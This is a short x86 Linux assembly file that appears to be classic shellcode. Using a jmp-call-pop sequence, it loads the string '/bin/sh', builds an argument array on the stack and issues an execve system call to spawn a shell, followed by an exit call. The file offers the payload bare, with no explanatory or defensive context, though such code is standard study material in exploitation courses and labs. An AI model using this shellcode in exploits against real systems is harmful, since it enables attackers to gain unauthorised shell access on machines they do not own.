.section .text
.globl _start
_start:
    jmp start
shellcode:
    popl %esi

    subl $0x8, %esp
    movl %esi, (%esp)
    movl $0x0, 0x4(%esp)

    movl $0xb, %eax
    movl %esi, %ebx
    leal (%esp), %ecx
    leal 0x4(%esp), %edx
    int  $0x80

    subl $0x8, %esp

    movb $0x1, %al
    xorl %ebx, %ebx
    int  $0x80

start:
    call shellcode
    .string "/bin/sh"
